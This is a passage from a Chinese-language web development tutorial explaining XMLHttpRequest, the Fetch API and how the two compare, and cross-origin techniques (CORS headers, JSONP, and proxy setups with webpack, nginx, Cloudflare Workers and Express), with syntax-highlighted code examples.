<td align="left">发送请求（可选请求体如JSON）</td>
</tr>
<tr>
<td align="left">.setRequestHeader(name, value)</td>
<td align="left">设置请求头（如Content-Type）</td>
</tr>
<tr>
<td align="left">.abort()</td>
<td align="left">终止请求</td>
</tr>
</tbody></table>
<p>关键属性：</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.readyState</td>
<td align="left">请求状态（0-4）</td>
</tr>
<tr>
<td align="left">.status</td>
<td align="left">HTTP状态码（如200, 404）</td>
</tr>
<tr>
<td align="left">.responseText</td>
<td align="left">文本响应数据</td>
</tr>
<tr>
<td align="left">.responseXML</td>
<td align="left">XML格式响应（已淘汰）</td>
</tr>
<tr>
<td align="left">.responseType</td>
<td align="left">指定响应格式（如json）</td>
</tr>
</tbody></table>
<p>事件监听（异步处理）：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">// 或使用现代事件监听</span>
xhr<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">>=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 成功处理</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Ajax 技术演进：</p>
<table>
<thead>
<tr>
<th align="left">技术阶段</th>
<th align="left">典型实现</th>
<th align="left">缺陷</th>
</tr>
</thead>
<tbody><tr>
<td align="left">原生XHR</td>
<td align="left">new XMLHttpRequest()</td>
<td align="left">回调地狱、繁琐错误处理</td>
</tr>
<tr>
<td align="left">jQueryAJAX</td>
<td align="left">$.ajax({ … })</td>
<td align="left">依赖jQuery库</td>
</tr>
<tr>
<td align="left">Fetch API</td>
<td align="left">fetch(url).then(…)</td>
<td align="left">更简洁的Promise方案</td>
</tr>
</tbody></table>
<p><strong>前端开发关键点</strong></p>
<p>（1）错误处理</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">xhr<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token comment">/* 网络错误处理 */</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">ontimeout</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token comment">/* 超时处理 */</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>（2）Content-Type 设置</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'value'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>（3）跨域请求</p>
<ul>
<li>需服务器设置Access-Control-Allow-Origin</li>
<li>可通过代理服务器转发</li>
</ul>
<h3 id="Fetch-API及与XHR对比"><a href="#Fetch-API及与XHR对比" class="headerlink" title="Fetch API及与XHR对比"></a>Fetch API及与XHR对比</h3><p><strong>Fetch API 核心原理</strong></p>
<p>定义：基于 Promise 的现代网络请求接口，替代传统 XMLHttpRequest（XHR），提供更简洁、强大的请求处理能力。</p>
<p>基本语法：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> options<span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Network error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 解析JSON响应</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>核心特性：</p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Promise 驱动</td>
<td align="left">链式调用替代回调嵌套，支持 async&#x2F;await</td>
</tr>
<tr>
<td align="left">流式数据处理</td>
<td align="left">响应体可分段读取（response.body），支持大文件处理</td>
</tr>
<tr>
<td align="left">默认不携带Cookie</td>
<td align="left">需显式设置 credentials: ‘include’</td>
</tr>
<tr>
<td align="left">更灵活的配置</td>
<td align="left">通过 init 对象配置所有参数</td>
</tr>
<tr>
<td align="left">内置响应类型</td>
<td align="left">支持 response.json()&#x2F;.text()&#x2F;.blob()&#x2F;.arrayBuffer() 等转换方法</td>
</tr>
</tbody></table>
<p>完整配置项：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>          <span class="token comment">// GET/POST/PUT/DELETE</span>
  <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
    <span class="token string-property property">'Authorization'</span><span class="token operator">:</span> <span class="token string">'Bearer token'</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 支持多种数据类型</span>
  <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>   <span class="token comment">// 携带Cookie</span>
  <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'cors'</span><span class="token punctuation">,</span>             <span class="token comment">// 跨域模式</span>
  <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'no-cache'</span><span class="token punctuation">,</span>        <span class="token comment">// 缓存控制</span>
  <span class="token literal-property property">redirect</span><span class="token operator">:</span> <span class="token string">'follow'</span>        <span class="token comment">// 重定向策略</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>Fetch API 与 XHR 关键对比</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">Fetch API</th>
<th align="left">XMLHttpRequest (XHR)</th>
</tr>
</thead>
<tbody><tr>
<td align="left">设计理念</td>
<td align="left">Promise 驱动的现代化 API</td>
<td align="left">基于事件的旧式 API</td>
</tr>
<tr>
<td align="left">语法复杂度</td>
<td align="left">简洁（链式调用）</td>
<td align="left">冗长（事件监听 + 状态检查）</td>
</tr>
<tr>
<td align="left">错误处理</td>
<td align="left">只对网络错误 reject（HTTP 404&#x2F;500 需手动处理）</td>
<td align="left">通过 status 检测所有错误</td>
</tr>
<tr>
<td align="left">超时控制</td>
<td align="left">需结合 AbortController 实现</td>
<td align="left">原生支持 timeout 属性</td>
</tr>
<tr>
<td align="left">进度追踪</td>
<td align="left">无原生进度事件</td>
<td align="left">支持 progress 事件（上传&#x2F;下载）</td>
</tr>
<tr>
<td align="left">请求取消</td>
<td align="left">通过 AbortController.abort()</td>
<td align="left">原生 xhr.abort()</td>
</tr>
<tr>
<td align="left">Cookie 策略</td>
<td align="left">默认不发送（更安全）</td>
<td align="left">默认发送（需手动禁止）</td>
</tr>
<tr>
<td align="left">响应类型处理</td>
<td align="left">通过方法转换（如 .json()）</td>
<td align="left">通过属性访问（如 responseText）</td>
</tr>
<tr>
<td align="left">跨域请求</td>
<td align="left">默认遵循 CORS</td>
<td align="left">同样遵循 CORS</td>
</tr>
</tbody></table>
<p><strong>典型场景代码对比</strong></p>
<p>（1）GET 请求</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Fetch</span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/data'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// XHR</span>
<span class="token keyword">const</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'/api/data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（2）POST 请求</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Fetch</span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/submit'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Alice'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// XHR</span>
<span class="token keyword">const</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'/api/submit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Alice'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（3）错误处理</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Fetch (需手动处理HTTP错误)</span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/data'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>status <span class="token operator">>=</span> <span class="token number">400</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'API error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// XHR (直接检测status)</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">>=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 成功</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 处理错误</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>最佳实践建议</strong></p>
<ul>
<li>优先使用 Fetch：现代项目首选（浏览器支持率 &gt; 98%），配合 async&#x2F;await 提升可读性：</li>
<li>XHR 适用场景：<ul>
<li>需要上传&#x2F;下载进度条（xhr.upload.onprogress）</li>
<li>兼容 IE11 等老旧浏览器</li>
</ul>
</li>
<li>补充工具：<ul>
<li>超时处理和中断请求：</li>
</ul>
</li>
</ul>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> controller<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">signal</span><span class="token operator">:</span> controller<span class="token punctuation">.</span>signal <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="跨域解决方案（CORS机制-JSONP-代理服务器）"><a href="#跨域解决方案（CORS机制-JSONP-代理服务器）" class="headerlink" title="跨域解决方案（CORS机制&#x2F;JSONP&#x2F;代理服务器）"></a>跨域解决方案（CORS机制&#x2F;JSONP&#x2F;代理服务器）</h3><p><strong>CORS（跨域资源共享）</strong></p>
<p>核心原理：</p>
<p>浏览器通过 HTTP头部协商 决定是否允许跨域请求，由服务器声明哪些外部域可访问资源。</p>
<p>关键流程：</p>
<ul>
<li>简单请求（Simple Request）：<ul>
<li>条件：GET&#x2F;HEAD&#x2F;POST + 特定头部（如Accept&#x2F;Content-Type: text&#x2F;plain）</li>
<li>浏览器直接发送请求，服务器响应：</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://client.com  // 必须指定具体域名或*</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>预检请求（Preflight Request）：<ul>
<li>触发条件：复杂操作（如PUT&#x2F;自定义头部&#x2F;Content-Type: application&#x2F;json）</li>
<li>浏览器先发OPTIONS请求：</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">OPTIONS</span> <span class="token request-target url">/api/data</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://client.com</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Request-Method</span><span class="token punctuation">:</span> <span class="token header-value">PUT</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Request-Headers</span><span class="token punctuation">:</span> <span class="token header-value">X-Custom-Header</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>服务器响应策略：</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">204</span> <span class="token reason-phrase string">No Content</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://client.com</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Methods</span><span class="token punctuation">:</span> <span class="token header-value">GET, POST, PUT</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Headers</span><span class="token punctuation">:</span> <span class="token header-value">X-Custom-Header</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Max-Age</span><span class="token punctuation">:</span> <span class="token header-value">86400  // 缓存预检结果（秒）</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>带凭证的请求：<ul>
<li>前端设置：fetch(url, { credentials: ‘include’ })</li>
<li>服务器响应：</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://client.com  // 不可用*</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Credentials</span><span class="token punctuation">:</span> <span class="token header-value">true</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
<p>前端代码示例：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 允许跨域的服务器响应头</span>
res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Origin'</span><span class="token punctuation">,</span> <span class="token string">'https://client.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Methods'</span><span class="token punctuation">,</span> <span class="token string">'GET, POST'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>SONP（JSON with Padding）</strong></p>
<p>原理：</p>
<p>利用 <code>&lt;script&gt;</code> 标签不受同源策略限制的特性，通过回调函数接收跨域数据。</p>
<p>实现步骤：</p>
<p>（1）前端定义全局回调函数</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Received:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>（2）动态创建 <code>&lt;script&gt;</code> 标签</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'https://api.example.com/data?callback=handleResponse'</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>（3）服务器返回函数调用包裹的 JSON</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>局限性：</p>
<ul>
<li>仅支持 GET 请求</li>
<li>无错误处理机制（无法捕获404&#x2F;500）</li>
<li>存在XSS风险（需信任服务器）</li>
</ul>
<p><strong>代理服务器（Proxy Server）</strong></p>
<p>原理：</p>
<p>将跨域请求转发到同源代理服务器，由代理访问目标服务，避开浏览器同源策略。</p>
<p>实现方式：</p>
<p>（1）开发环境代理</p>
<p>适用场景：前端本地开发调试</p>
<p>实现工具：webpack.devServer</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// webpack.config.js</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">devServer</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">proxy</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token string-property property">'/api'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'https://api.example.com'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">'^/api'</span><span class="token operator">:</span> <span class="token string">''</span> <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（2）生产环境反向代理</p>
<p>适用场景：线上部署</p>
<p>主流方案：nginx 配置</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>
  <span class="token directive"><span class="token keyword">listen</span> <span class="token number">80</span></span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">server_name</span> my-domain.com</span><span class="token punctuation">;</span>

  <span class="token directive"><span class="token keyword">location</span> /api/</span> <span class="token punctuation">&#123;</span>
    <span class="token directive"><span class="token keyword">proxy_pass</span> https://api.example.com/</span><span class="token punctuation">;</span>  <span class="token comment"># 目标地址</span>
    <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span></span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（3）无服务器代理</p>
<p>适用场景：无需维护基础设施</p>
<p>实现方案：Cloudflare Workers</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span><span class="token function">handleRequest</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">handleRequest</span><span class="token punctuation">(</span><span class="token parameter">request</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
  url<span class="token punctuation">.</span>hostname <span class="token operator">=</span> <span class="token string">'api.example.com'</span><span class="token punctuation">;</span>  <span class="token comment">// 替换目标域名</span>
  <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（4）编程式中间件代理</p>
<p>适用场景：自定义代理逻辑</p>
<p>实现方式：Node.js</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
